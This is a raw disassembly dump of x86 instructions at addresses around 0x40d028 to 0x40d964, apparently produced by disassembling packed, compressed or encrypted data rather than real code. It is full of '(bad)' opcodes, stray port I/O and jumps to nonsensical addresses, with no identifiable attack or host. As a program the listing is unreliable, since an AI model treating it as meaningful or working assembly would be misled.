  40d028:	push   cs
  40d029:	mov    DWORD PTR [edi+0x2],edi
  40d02c:	sub    BYTE PTR [esp+ebp*1],al
  40d02f:	std    
  40d030:	imul   ebp,esp,0xffffffe7
  40d033:	add    ch,BYTE PTR [ecx+0x3]
  40d036:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d037:	ss and al,0x2c
  40d03a:	addr16 inc ebx
  40d03c:	sub    BYTE PTR [eax+ebx*8],al
  40d03f:	stos   BYTE PTR es:[edi],al
  40d040:	fadd   QWORD PTR [edi+eiz*4+0x2]
  40d044:	loop   0x40d009
  40d046:	hlt    
  40d047:	pop    ds
  40d048:	pop    ss
  40d049:	lods   al,BYTE PTR ds:[esi]
  40d04a:	test   eax,0xc3a63a
	...
  40d063:	lock sub ch,cl
  40d066:	add    ecx,DWORD PTR [eax-0x80]
  40d069:	add    dh,cl
  40d06b:	in     eax,0x41
  40d06d:	jmp    0xf17618c5
  40d072:	stos   DWORD PTR es:[edi],eax
  40d073:	ja     0x40d008
  40d075:	jge    0x40d03a
  40d077:	inc    eax
  40d078:	pop    ebp
  40d079:	pop    es
  40d07a:	ret    
  40d07b:	xor    DWORD PTR [ebx+0x2749e7],ebp
  40d081:	jmp    0x5d88edbe
  40d086:	neg    DWORD PTR [eax+0x79]
  40d089:	push   ebp
  40d08a:	ret    
  40d08b:	adc    DWORD PTR [edi+0x7d0725a],edi
  40d091:	mov    esp,0x3d35017e
  40d096:	ret    
  40d097:	jae    0x40d0a3
  40d099:	inc    ecx
  40d09a:	jge    0x40d119
  40d09c:	mov    edi,0xc949632d
  40d0a1:	sub    cl,BYTE PTR [eax]
  40d0a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0a4:	push   ebp
  40d0a5:	jb     0x40d057
  40d0a7:	and    eax,0xe85710c6
  40d0ac:	inc    esp
  40d0ad:	adc    DWORD PTR [edi+eiz*4],eax
  40d0b0:	add    ch,cl
  40d0b2:	retf   0xbe6b
  40d0b5:	call   0x4377bd
  40d0ba:	bound  ebx,QWORD PTR [esi+0xe]
  40d0bd:	xor    DWORD PTR [ecx+0x120935a4],0x6b
  40d0c4:	jmp    0x41139a
	...
  40d0d9:	add    BYTE PTR [eax],al
  40d0db:	add    BYTE PTR [edx-0x3c],ch
  40d0de:	or     ebp,ecx
  40d0e0:	adc    DWORD PTR [ebx],eax
  40d0e2:	add    cl,ch
  40d0e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0e5:	test   eax,0x12e76a60
  40d0ea:	add    BYTE PTR ds:0xd94489ae,dh
  40d0f0:	and    edx,DWORD PTR [esi]
  40d0f2:	push   DWORD PTR [edi+edx*4]
  40d0f5:	mov    ebp,0xcd0cf174
  40d0fa:	addr16 sahf 
  40d0fc:	gs cmp edx,0x9078fe0
  40d103:	and    al,0xb
  40d105:	test   eax,0x3d4e1945
  40d10a:	(bad)  
  40d10b:	jle    0x40d172
  40d10d:	or     eax,DWORD PTR [ebp+0x71]
  40d110:	int3   
  40d111:	imul   edi,DWORD PTR [edi-0x17],0xffffffa4
  40d115:	add    dh,BYTE PTR [ebp-0x15]
  40d118:	push   ecx
  40d119:	icebp  
  40d11a:	and    BYTE PTR [edx-0x54],0x37
  40d11e:	adc    eax,0x8aba5f62
  40d123:	mov    ah,0x48
  40d125:	or     eax,0xc3ac2ba4
  40d12a:	fcomip st,st(1)
  40d12c:	sub    eax,DWORD PTR [edi-0x8]
  40d12f:	pusha  
  40d130:	dec    edi
  40d131:	mov    esi,0x4719daea
  40d136:	clc    
  40d137:	jb     0x40d1b8
  40d139:	mov    esi,0x4e2450e
  40d13e:	ror    DWORD PTR [ecx],0x0
	...
  40d155:	popf   
  40d156:	mov    eax,DWORD PTR [ecx+edx*1+0x1b]
  40d15a:	push   edi
  40d15b:	cld    
  40d15c:	add    BYTE PTR ds:0x3009f985,cl
  40d162:	lahf   
  40d163:	mov    DWORD PTR [ebp-0x36],eax
  40d166:	test   BYTE PTR [esi],dh
  40d168:	add    BYTE PTR [ebx],dh
  40d16a:	or     ebp,DWORD PTR [ebx]
  40d16c:	shl    BYTE PTR [ebp+0x1506e9d4],0x46
  40d173:	clc    
  40d174:	mov    edx,ebx
  40d176:	ret    0xc959
  40d179:	cmp    al,0x12
  40d17b:	add    BYTE PTR [ebp-0xb],dl
  40d17e:	jb     0x40d101
  40d180:	les    esi,FWORD PTR [edx]
  40d182:	and    ebx,eax
  40d184:	mov    di,0x3906
  40d188:	inc    ebp
  40d189:	dec    edx
  40d18a:	sti    
  40d18b:	add    eax,0xc0c90e2b
  40d190:	adc    BYTE PTR [esi-0x3e],cl
  40d193:	xor    eax,esp
  40d195:	mov    al,ds:0x99e80041
  40d19a:	in     eax,dx
  40d19b:	(bad)  
  40d19c:	push   DWORD PTR [edi-0x7c7207bb]
  40d1a2:	ret    0xe84e
  40d1a5:	jmp    0x13f5:0xb9fffeea
  40d1ac:	inc    DWORD PTR [ebx]
  40d1ae:	or     eax,0xc38675ff
  40d1b3:	jae    0x40d1bd
  40d1b5:	sub    WORD PTR [esi-0x1],sp
	...
  40d1cd:	add    BYTE PTR [ecx+0xf],bl
  40d1d0:	ror    BYTE PTR [edi],0x92
  40d1d3:	sub    bh,bh
  40d1d5:	dec    DWORD PTR [esi]
  40d1d7:	ret    0xc73
  40d1da:	mov    ecx,0x33fff7f5
  40d1df:	jge    0x40d1c7
  40d1e1:	stc    
  40d1e2:	xor    eax,edx
  40d1e4:	std    
  40d1e5:	mov    eax,DWORD PTR [ebx]
  40d1e7:	or     eax,0xbba7453b
  40d1ec:	jae    0x437cf5
  40d1f2:	sar    BYTE PTR ds:0xb332ff17,0xaa
  40d1f9:	mov    eax,ds:0x88bfb448
  40d1fe:	bound  esi,QWORD PTR [edi-0x85f8c55]
  40d204:	mov    bh,0x2a
  40d206:	jne    0x40d239
  40d208:	inc    esi
  40d209:	hlt    
  40d20a:	cwde   
  40d20b:	bswap  eax
  40d20d:	gs out 0xa9,al
  40d210:	or     edx,edx
  40d212:	sti    
  40d213:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d214:	stos   DWORD PTR es:[edi],eax
  40d215:	addr16 or eax,0xfaff52aa
  40d21b:	mov    eax,ds:0x6d0388aa
  40d220:	mov    edi,0xbfbddafe
  40d225:	je     0x40d1d6
  40d227:	xchg   ecx,eax
  40d228:	xor    esp,DWORD PTR [edi+0x50]
  40d22b:	xchg   ebp,eax
  40d22c:	mov    edx,DWORD PTR [ebx+esi*4+0x28]
  40d230:	std    
  40d231:	inc    DWORD PTR [eax]
	...
  40d247:	mov    ebx,0x2e47aba7
  40d24c:	out    0xb7,eax
  40d24e:	mov    ah,BYTE PTR [edx-0x58bed793]
  40d254:	sub    BYTE PTR [edx+0x36247603],ch
  40d25a:	adc    al,0x76
  40d25c:	pop    esp
  40d25d:	ss clc 
  40d25f:	adc    bh,bl
  40d261:	or     ch,al
  40d263:	rol    ah,0xbf
  40d266:	(bad)  
  40d267:	pop    esi
  40d268:	mov    al,0xc2
  40d26a:	je     0x40d211
  40d26c:	push   eax
  40d26d:	out    0x50,al
  40d26f:	lock jle 0x40d22c
  40d272:	(bad)  
  40d273:	jb     0x40d262
  40d275:	stos   BYTE PTR es:[edi],al
  40d276:	jns    0x40d2c2
  40d278:	add    ah,BYTE PTR [esi]
  40d27a:	rcr    cl,0x35
  40d27d:	sbb    eax,0x162654ab
  40d282:	ror    BYTE PTR [ebx-0x56bc16fe],0x34
  40d289:	jmp    0x40d237
  40d28b:	mov    al,ds:0xb0b77b7f
  40d290:	outs   dx,DWORD PTR ss:[esi]
  40d292:	lods   al,BYTE PTR ds:[esi]
  40d293:	nop
  40d294:	mov    ebx,0x88bf73
  40d299:	dec    ebp
  40d29a:	mov    edi,0xc023c399
  40d29f:	nop
  40d2a0:	mov    ebx,0x451c03e8
  40d2a5:	cmc    
  40d2a6:	mov    BYTE PTR [eax+0x3e8bb],0x0
	...
  40d2bd:	add    BYTE PTR [eax],al
  40d2bf:	add    BYTE PTR [edi-0x7743cc45],ah
  40d2c5:	cmp    eax,0x8769bf45
  40d2ca:	and    eax,eax
  40d2cc:	outs   dx,DWORD PTR ds:[esi]
  40d2cd:	sar    al,0x3
  40d2d0:	xacquire xchg DWORD PTR [edi+edx*2-0x7d1abae4],ecx
  40d2d8:	or     BYTE PTR [edx],cl
  40d2da:	cmp    DWORD PTR [ebx+eax*8+0x2dbf862e],ebp
  40d2e1:	mov    edx,0x8ba3397d
  40d2e6:	in     eax,dx
  40d2e7:	mov    esi,0x475e12b3
  40d2ec:	stos   DWORD PTR es:[edi],eax
  40d2ed:	jg     0x40d2d2
  40d2ef:	(bad)  
  40d2f1:	ss out dx,al
  40d2f3:	mov    esi,0x47640e9b
  40d2f8:	lahf   
  40d2f9:	push   edx
  40d2fa:	dec    esi
  40d2fb:	cmp    DWORD PTR [edi-0x7cfa556],ebp
  40d301:	mov    edx,0x899b4971
  40d306:	push   eax
  40d308:	ins    BYTE PTR es:[edi],dx
  40d309:	add    al,BYTE PTR [eax]
  40d30b:	jmp    0x2c0a2eb4
  40d310:	mov    bl,0x2
  40d312:	push   ebp
  40d313:	jb     0x40d32c
  40d315:	add    bl,0x1d
  40d318:	sbb    al,0x56
  40d31a:	adc    al,0x26
  40d31c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d31d:	add    al,BYTE PTR [eax]
  40d31f:	jmp    0xf712bac8
	...
  40d338:	add    BYTE PTR [edi+0xe],bl
  40d33b:	add    ecx,ebp
  40d33d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d33e:	add    cl,BYTE PTR [edi]
  40d340:	push   ebp
  40d341:	test   DWORD PTR gs:[ebp+esi*8-0x5c],edi
  40d346:	das    
  40d347:	adc    ebx,esi
  40d349:	iret   
  40d34a:	push   cs
  40d34b:	push   0xffffffea
  40d34d:	mov    esi,0x4ce96a02
  40d352:	mov    bh,dh
  40d354:	(bad)  
  40d355:	cmp    DWORD PTR [ebx+0x2a4eb28],ebp
  40d35b:	xor    DWORD PTR [edi+edx*4],0x3
  40d35f:	jne    0x40d36b
  40d361:	and    BYTE PTR [edi],ch
  40d363:	adc    BYTE PTR [esi-0x5317f561],ah
  40d369:	mov    bh,BYTE PTR [ecx-0x49209f02]
  40d36f:	(bad)  
  40d370:	adc    al,0x9f
  40d372:	sub    al,0x0
  40d374:	adc    ebp,DWORD PTR [edi-0x2b82bb79]
  40d37a:	stos   BYTE PTR es:[edi],al
  40d37b:	data16 jbe 0x40d367
  40d37e:	mov    eax,0x2a6e9e8
  40d383:	add    BYTE PTR [edx+0x67],ch
  40d386:	push   es
  40d387:	add    dl,ah
  40d389:	add    eax,0x49f974b9
  40d38e:	das    
  40d38f:	or     BYTE PTR [ecx-0x47],al
  40d392:	and    bh,bh
  40d394:	add    BYTE PTR [ecx-0x7a],ah
  40d397:	inc    ebx
  40d398:	cld    
  40d399:	mov    cl,0xfa
  40d39b:	adc    ebp,DWORD PTR [edx+0x0]
	...
  40d3b2:	(bad)  
  40d3b3:	jmp    0x40d3b8
  40d3b5:	lea    ecx,[ebx]
  40d3b7:	jp     0x40d407
  40d3b9:	call   0x3e4c7e
  40d3be:	mov    bh,0xd0
  40d3c0:	(bad)  
  40d3c1:	(bad)  
  40d3c2:	mov    esi,0xcd0c7b84
  40d3c7:	cli    
  40d3c8:	pop    ds
  40d3c9:	(bad)  
  40d3ca:	cmp    edx,DWORD PTR ds:0xf1b1036a
  40d3d0:	pop    es
  40d3d1:	call   0x3fb330
  40d3d6:	xchg   ecx,eax
  40d3d7:	icebp  
  40d3d8:	adc    ebp,DWORD PTR [edx-0x73]
  40d3db:	jmp    0x40d3dc
  40d3dd:	imul   edi,DWORD PTR [esi+0x6d],0x7771ff16
  40d3e4:	out    0xb1,eax
  40d3e6:	pop    DWORD PTR ds:0x12e38300
  40d3ec:	add    al,0x75
  40d3ee:	popf   
  40d3ef:	ja     0x40d464
  40d3f1:	adc    BYTE PTR [ecx],dh
  40d3f3:	icebp  
  40d3f4:	pop    es
  40d3f5:	call   0x3fb50c
  40d3fa:	xlat   BYTE PTR ds:[ebx]
  40d3fb:	inc    ecx
  40d3fc:	cld    
  40d3fd:	(bad)  
  40d3fe:	mov    ebx,0xa4006a1a
  40d403:	or     cl,BYTE PTR [ebp-0x17b1cdbb]
  40d409:	out    dx,eax
  40d40a:	and    BYTE PTR [edi-0x3],dh
  40d40d:	jmp    0x40d9c8
  40d412:	mov    ebp,0x50bf9
	...
  40d42b:	sbb    ecx,DWORD PTR [esi]
  40d42d:	push   DWORD PTR [ebp+0x1e]
  40d430:	jmp    0x40d437
  40d432:	(bad)  
  40d433:	sti    
  40d434:	or     al,0xe8
  40d436:	push   ebp
  40d437:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d438:	leave  
  40d439:	mov    ebx,0x2aa3ffe
  40d43e:	add    BYTE PTR [edi-0x58fed6ae],ah
  40d444:	stos   DWORD PTR es:[edi],eax
  40d445:	jg     0x40d4c3
  40d447:	fwait
  40d448:	test   eax,0x6de02035
  40d44d:	adc    ch,BYTE PTR [edx-0x51]
  40d450:	loopne 0x40d488
  40d452:	or     BYTE PTR [edi-0x3700db5e],bh
  40d458:	getsec 
  40d45a:	adc    al,0x4d
  40d45c:	lods   al,BYTE PTR ds:[esi]
  40d45d:	sub    BYTE PTR [eax],al
  40d45f:	dec    ebp
  40d460:	stos   DWORD PTR es:[edi],eax
  40d461:	stos   BYTE PTR es:[edi],al
  40d462:	stos   DWORD PTR es:[edi],eax
  40d463:	mov    cl,0xb7
  40d465:	mov    ebx,0x2aa62e8
  40d46a:	add    BYTE PTR [edi+eiz*1],ah
  40d46d:	sysret 
  40d46f:	adc    cl,BYTE PTR [edx]
  40d471:	mov    ebp,0xc53b774
  40d476:	call   DWORD PTR [edx]
  40d478:	mov    ds:0xc90911aa,al
  40d47d:	mov    ebx,0x28d5f2fe
  40d482:	add    edi,ebp
  40d484:	test   eax,0x287f0028
  40d489:	mov    ebp,0x1bc360fe
  40d48e:	add    DWORD PTR [eax],eax
	...
  40d4a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4a5:	test   eax,0xb1a37c7f
  40d4aa:	xor    eax,0xbfe7601c
  40d4af:	inc    DWORD PTR [eax-0x56]
  40d4b2:	add    bh,bh
  40d4b4:	mov    dl,0xd5
  40d4b6:	sub    BYTE PTR [eax],al
  40d4b8:	mov    ebp,0x2b448d9d
  40d4bd:	sbb    ch,BYTE PTR [ebx+eiz*2-0x1743d6df]
  40d4c4:	sbb    al,BYTE PTR [ebx]
  40d4c6:	jmp    0xdbc47bce
  40d4cb:	setle  BYTE PTR ds:0xb66bc4f5
  40d4d2:	out    0x3,eax
  40d4d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d4d5:	add    al,BYTE PTR [esi+0x36]
  40d4d8:	fwait
  40d4d9:	sub    al,0xe9
  40d4db:	sub    DWORD PTR [ebx+0x70bfab85],esp
  40d4e1:	stos   BYTE PTR es:[edi],al
  40d4e2:	stos   BYTE PTR es:[edi],al
  40d4e3:	mov    ebp,0xd80fb7d9
  40d4e8:	shl    BYTE PTR [edi+0x64b80e8],1
  40d4ee:	jecxz  0x40d526
  40d4f0:	lods   eax,DWORD PTR ds:[esi]
  40d4f1:	jp     0x40d4db
  40d4f3:	add    esp,DWORD PTR [edi-0x4f37effe]
  40d4f9:	mov    bh,0xe8
  40d4fb:	sub    BYTE PTR [ebx],0x6
  40d4fe:	loop   0x40d536
  40d500:	lods   eax,DWORD PTR ds:[esi]
  40d501:	jp     0x40d4eb
  40d503:	add    esp,DWORD PTR [edi+0x7fd002]
	...
  40d51d:	nop
  40d51e:	mov    bh,0xe8
  40d520:	xchg   BYTE PTR [ebx],cl
  40d522:	pop    es
  40d523:	in     eax,0x35
  40d525:	fimul  DWORD PTR [ebx]
  40d527:	mov    ebx,0x4381d630
  40d52c:	or     BYTE PTR [edi-0xbfdd6fe],ah
  40d532:	dec    edx
  40d533:	mov    dh,0x31
  40d535:	mov    bl,0x87
  40d537:	and    esi,DWORD PTR [eax+0x89d2525]
  40d53d:	jbe    0x40d564
  40d53f:	xchg   ebp,eax
  40d540:	mov    ebx,0x8680aed3
  40d545:	into   
  40d546:	mov    bh,0x8d
  40d548:	(bad)  
  40d549:	jecxz  0x40d505
  40d54b:	test   DWORD PTR [ecx],esi
  40d54d:	xchg   edi,eax
  40d54e:	mov    bh,0xf3
  40d550:	scas   eax,DWORD PTR es:[edi]
  40d551:	sub    DWORD PTR ds:0x2e5c7100,ebp
  40d557:	or     BYTE PTR [ecx+0x66ff2396],al
  40d55d:	dec    esp
  40d55e:	cs adc al,0xd3
  40d561:	mov    ds:0x3c5d74b7,al
  40d566:	cs clc 
  40d568:	inc    ecx
  40d569:	shl    BYTE PTR [ebp+0x2e2c46fe],cl
  40d56f:	clc    
  40d570:	push   ecx
  40d571:	in     al,dx
  40d572:	sub    bh,bh
  40d574:	arpl   WORD PTR ss:[edx],ax
  40d577:	add    cl,ch
  40d579:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d57a:	stos   DWORD PTR es:[edi],eax
  40d57b:	pop    edi
  40d57c:	push   0xffffff8e
  40d57e:	push   es
  40d57f:	or     eax,0x9b
	...
  40d594:	add    BYTE PTR [eax],al
  40d596:	ja     0x40d5a3
  40d598:	rcr    BYTE PTR [ebx+ebx*2-0x5b22837f],cl
  40d59f:	add    al,BYTE PTR [eax-0x11]
  40d5a2:	jns    0x40d5ee
  40d5a4:	push   DWORD PTR [eax+eiz*4-0x79]
  40d5a8:	inc    esp
  40d5a9:	std    
  40d5aa:	sub    DWORD PTR [edi],esp
  40d5ac:	hlt    
  40d5ad:	fdiv   QWORD PTR [ebx+0x27]
  40d5b0:	hlt    
  40d5b1:	out    0xd7,al
  40d5b3:	scas   al,BYTE PTR es:[edi]
  40d5b4:	out    0x6,eax
  40d5b6:	mov    ecx,0xe760feb5
  40d5bb:	mov    edx,0xb59354fe
  40d5c0:	je     0x40d57f
  40d5c2:	sub    eax,0xb7bef82f
  40d5c7:	or     ch,al
  40d5c9:	adc    eax,DWORD PTR [edi-0x6851014b]
  40d5cf:	push   cs
  40d5d0:	push   0xffffffe8
  40d5d2:	or     eax,0x979ef42f
  40d5d7:	mov    edx,0xb4fe1fe7
  40d5dc:	dec    BYTE PTR [esi+0xe7ba77]
  40d5e2:	and    ah,bh
  40d5e4:	(bad)  
  40d5e5:	jmp    esi
  40d5e7:	(bad)  
  40d5e8:	(bad)  
  40d5e9:	dec    DWORD PTR [esi]
  40d5eb:	add    edi,DWORD PTR gs:[eax+0x20e]
  40d5f2:	xlat   BYTE PTR ds:[ebx]
  40d5f3:	mov    edi,0x8553000e
  40d5f8:	jmp    0x0:0x56
	...
  40d60f:	(bad)  
  40d610:	cli    
  40d611:	pop    es
  40d612:	add    bl,dl
  40d614:	add    bl,BYTE PTR [esi-0x37]
  40d617:	mov    esp,0x338afeb5
  40d61c:	or     ch,bl
  40d61e:	or     bl,BYTE PTR [ecx-0x1846194d]
  40d624:	js     0x40d623
  40d626:	add    DWORD PTR [eax-0x41c17e4b],0xfffffff2
  40d62d:	lock jmp DWORD PTR [ebx]
  40d630:	or     ch,al
  40d632:	test   eax,0x5efd7927
  40d637:	ja     0x40d5f8
  40d639:	add    al,BYTE PTR [eax]
  40d63b:	adc    eax,DWORD PTR [ebp+0x9538bea]
  40d641:	mov    edx,DWORD PTR [ebp+0x7a]
  40d644:	test   BYTE PTR [edx],al
  40d646:	nop
  40d647:	std    
  40d648:	in     eax,dx
  40d649:	(bad)  
  40d64b:	repnz add ecx,DWORD PTR [ebx+0x2e7a7e55]
  40d652:	(bad)  
  40d653:	mov    WORD PTR [esi+0x7b],?
  40d656:	adc    al,0x7e
  40d658:	in     eax,0x7
  40d65a:	mov    edx,DWORD PTR [ebx+0x5270ff12]
  40d660:	mov    al,BYTE PTR [eax]
  40d662:	or     DWORD PTR [ebx+0x57740016],0xffffff86
  40d669:	push   ebx
  40d66a:	sbb    BYTE PTR [esi-0x587cff75],cl
  40d670:	test   eax,0xc90a
	...
  40d685:	add    BYTE PTR [eax],al
  40d687:	add    BYTE PTR [ebp-0x51],ah
  40d68a:	add    dl,BYTE PTR [ebp+0x1c]
  40d68d:	pop    DWORD PTR [ebx+eax*8-0x74adf3b5]
  40d694:	push   0xffffffdb
  40d696:	mov    edi,0x2ab18ff
  40d69b:	add    BYTE PTR [esi+eiz*2],bl
  40d69e:	push   es
  40d69f:	(bad)  
  40d6a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6a1:	stos   DWORD PTR es:[edi],eax
  40d6a2:	add    al,BYTE PTR [eax]
  40d6a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6a5:	sub    BYTE PTR [edi],dh
  40d6a7:	or     BYTE PTR [edi-0x18d4f532],ah
  40d6ad:	pop    esp
  40d6ae:	push   edi
  40d6af:	leave  
  40d6b0:	in     eax,0xa6
  40d6b2:	add    bh,bh
  40d6b4:	pop    edx
  40d6b5:	mov    ds:0xe447ffaa,eax
  40d6ba:	mov    eax,0xa95e70a
  40d6bf:	sub    esp,edi
  40d6c1:	je     0x40d71a
  40d6c3:	leave  
  40d6c4:	in     eax,0x9e
  40d6c6:	add    cl,BYTE PTR [ecx+0x74b91362]
  40d6cc:	lahf   
  40d6cd:	adc    ecx,DWORD PTR [esi]
  40d6cf:	arpl   WORD PTR [eax-0x64bb404d],bp
  40d6d5:	stos   DWORD PTR es:[edi],eax
  40d6d6:	add    al,BYTE PTR [eax]
  40d6d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6d9:	push   esi
  40d6da:	aas    
  40d6db:	in     al,dx
  40d6dc:	imul   DWORD PTR [esi]
  40d6de:	ds hlt 
  40d6e0:	not    esp
  40d6e2:	sub    eax,0xbc758f08
  40d6e7:	(bad)  
  40d6e8:	js     0x40d6fd
  40d6ea:	aas    
  40d6eb:	in     al,dx
	...
  40d700:	add    al,bh
  40d702:	scas   eax,DWORD PTR es:[edi]
  40d703:	cmp    DWORD PTR [ebx+esi*2-0x56],0x2e
  40d708:	add    al,0xac
  40d70a:	xchg   edi,eax
  40d70b:	or     BYTE PTR cs:[ecx+ebp*2+0x35e5f58],cl
  40d713:	stos   DWORD PTR es:[edi],eax
  40d714:	pop    es
  40d715:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d716:	out    0x23,eax
  40d718:	test   al,0x2f
  40d71a:	add    DWORD PTR ds:[edx+0x3e8aabb],0xbff0307
  40d725:	jl     0x40d6e9
  40d727:	push   ds
  40d728:	pop    ecx
  40d729:	out    dx,al
  40d72a:	shl    ah,0x3
  40d72d:	sub    al,0x3e
  40d72f:	add    edx,0xabb900f0
  40d735:	jmp    FWORD PTR [edx]
  40d737:	pop    esi
  40d738:	mov    eax,0x8c553e2f
  40d73d:	lock mov ebx,0xb3f09fa3
  40d743:	call   0x6c30d34b
  40d748:	xlat   BYTE PTR ds:[ebx]
  40d74a:	push   edx
  40d74b:	fs rcl DWORD PTR ds:[edx+0x2e],cl
  40d750:	cs lahf 
  40d752:	stos   BYTE PTR es:[edi],al
  40d753:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d754:	mov    ebp,0x4671b3c9
  40d759:	mov    bh,0xf7
  40d75b:	mov    ds:0xe1fe31ab,eax
  40d760:	aad    0x34
  40d762:	adc    al,BYTE PTR [esi]
  40d764:	add    BYTE PTR cs:[eax],al
	...
  40d777:	add    BYTE PTR [eax],al
  40d779:	add    BYTE PTR [ebx-0x5fd4b756],ch
  40d77f:	mov    bl,0xc1
  40d781:	ret    
  40d782:	cli    
  40d783:	push   ebx
  40d784:	and    ch,al
  40d786:	pushf  
  40d787:	add    dl,BYTE PTR [eax]
  40d789:	dec    ecx
  40d78a:	jg     0x40d73f
  40d78c:	and    esp,DWORD PTR [eax-0x53ac80b3]
  40d792:	js     0x40d7c1
  40d794:	out    0x82,eax
  40d796:	repz scas al,BYTE PTR es:[edi]
  40d798:	call   0x3bc03dcd
  40d79d:	lods   al,BYTE PTR ds:[esi]
  40d79e:	pusha  
  40d79f:	cs add bh,ch
  40d7a2:	and    eax,0x97e9f436
  40d7a7:	adc    bh,bh
  40d7a9:	sbb    al,0xf
  40d7ab:	fwait
  40d7ac:	jo     0x40d7bf
  40d7ae:	clc    
  40d7af:	mov    bl,0x2a
  40d7b1:	test   eax,0xabc953d1
  40d7b6:	lahf   
  40d7b7:	add    al,BYTE PTR [ebx+0x73b30704]
  40d7bd:	in     al,0x53
  40d7bf:	mov    bh,bh
  40d7c1:	call   0xd9855f6a
  40d7c6:	pop    ecx
  40d7c7:	cs in  al,0x76
  40d7ca:	mov    ds:0xea454487,eax
  40d7cf:	rol    BYTE PTR [ecx],cl
  40d7d1:	mov    ecx,0x4e68224c
  40d7d6:	cmp    BYTE PTR [edx+0x361c2544],cl
  40d7dc:	fdiv   QWORD PTR [edx+0x0]
	...
  40d7f3:	xchg   esi,eax
  40d7f4:	mov    dh,0xea
  40d7f6:	xchg   ecx,eax
  40d7f7:	dec    edi
  40d7f8:	mov    bh,cl
  40d7fa:	data16 mov es:0x2a4e8ff,al
  40d801:	lea    esp,[esp+eax*1+0x8ac8d43]
  40d808:	inc    ebx
  40d809:	push   edx
  40d80a:	push   cs
  40d80b:	jbe    0x40d817
  40d80d:	call   0xfef4c428
  40d812:	repnz fs ss or al,0x6a
  40d817:	fidiv  WORD PTR [esi-0x7a6d8b01]
  40d81d:	jl     0x40d7e8
  40d81f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d820:	aaa    
  40d821:	es push 0xffffffbf
  40d824:	mov    ds:0xb1ab5cff,al
  40d829:	je     0x40d7f4
  40d82b:	cmp    al,0x8
  40d82d:	push   0xfd796100
  40d832:	jne    0x40d876
  40d834:	pop    esi
  40d835:	sub    dh,bh
  40d837:	adc    DWORD PTR [ecx-0x3],edi
  40d83a:	jne    0x40d83e
  40d83c:	pop    esi
  40d83d:	hlt    
  40d83e:	add    DWORD PTR [bx+di+0x29],edi
  40d842:	rol    BYTE PTR [eax+0x42c2c959],0x6
  40d849:	mov    eax,DWORD PTR [ebp+0x1e]
  40d84c:	sbb    eax,0x851a4dfe
  40d851:	jnp    0x40d837
  40d853:	push   cs
  40d854:	loop   0x40d85b
  40d856:	add    DWORD PTR [eax],0x0
	...
  40d869:	add    BYTE PTR [eax],al
  40d86b:	add    BYTE PTR [ebx],dl
  40d86d:	(bad)  
  40d86e:	(bad)  
  40d86f:	je     0x40d8d3
  40d871:	jl     0x40d8b6
  40d873:	or     al,0x81
  40d875:	repnz fisttp DWORD PTR [edi-0x38c86f2]
  40d87c:	mov    sp,0xff65
  40d880:	popa   
  40d881:	sub    eax,0x5fe0000
  40d886:	pop    esi
  40d887:	pop    edi
  40d888:	xchg   edi,eax
  40d889:	ret    
  40d88a:	or     al,BYTE PTR [eax]
  40d88c:	cmp    edi,DWORD PTR [ebp-0x16]
  40d88f:	or     DWORD PTR [edx+0x38355bd],0x16
  40d896:	add    BYTE PTR [ebp-0x4c],dh
  40d899:	sub    eax,0x5ce0000
  40d89e:	pop    edi
  40d89f:	leave  
  40d8a0:	jl     0x40d8a3
  40d8a2:	add    bh,bh
  40d8a4:	repz adc eax,0x4315d22b
  40d8aa:	adc    bh,dh
  40d8ac:	imul   esi,DWORD PTR [ecx+0x64],0x41
  40d8b0:	jle    0x40d930
  40d8b2:	inc    ebx
  40d8b3:	lock hlt 
  40d8b5:	push   es
  40d8b6:	push   DWORD PTR [ebp+0x5e]
  40d8b9:	ja     0x40d92e
  40d8bb:	or     BYTE PTR [edi+0x705f19c3],ah
  40d8c1:	rol    BYTE PTR [eax+0x2d9b977c],0xc
  40d8c8:	int    0x9a
  40d8ca:	sub    BYTE PTR [eax+ebx*2-0x12],ah
  40d8ce:	or     ebp,eax
	...
  40d8e4:	add    BYTE PTR [edi+0x48feb500],bl
  40d8ea:	push   cs
  40d8eb:	adc    bh,bh
  40d8ed:	mov    edx,0xc54aaab3
  40d8f2:	cwde   
  40d8f3:	mov    ah,0x88
  40d8f5:	jmp    0x2e88:0x9374b47f
  40d8fc:	or     BYTE PTR [edi],cl
  40d8fe:	retf   
  40d8ff:	and    bh,bh
  40d901:	sbb    BYTE PTR [eax],bh
  40d903:	das    
  40d904:	adc    al,0x10
  40d906:	mov    dh,0xa
  40d908:	call   0xfef496af
  40d90d:	cs mov dx,0x72fe
  40d912:	scas   eax,DWORD PTR es:[edi]
  40d913:	mov    bl,0x74
  40d915:	lahf   
  40d916:	inc    ebx
  40d917:	lods   eax,DWORD PTR ds:[esi]
  40d918:	pusha  
  40d919:	call   0xbbb58e65
  40d91e:	lock cs or bh,cl
  40d922:	shl    DWORD PTR [eax],1
  40d924:	call   eax
  40d926:	and    edi,DWORD PTR [edi]
  40d928:	adc    al,0x24
  40d92a:	mov    ds:0x1cb37402,eax
  40d92f:	aaa    
  40d930:	cld    
  40d931:	stos   BYTE PTR es:[edi],al
  40d932:	pop    DWORD PTR ds:0xfeff3283
  40d938:	jae    0x40d8da
  40d93a:	aam    0xc2
  40d93c:	pop    esi
  40d93d:	outs   dx,BYTE PTR ds:[esi]
  40d93e:	fmul   QWORD PTR [edi]
  40d940:	add    BYTE PTR [esi-0x22],al
  40d943:	sbb    eax,0xac0aa741
  40d948:	cmp    BYTE PTR [eax],al
	...
  40d95e:	loop   0x40d962
  40d960:	loope  0x40d98f
  40d962:	test   al,0xdb
  40d964:	test   al,0x54
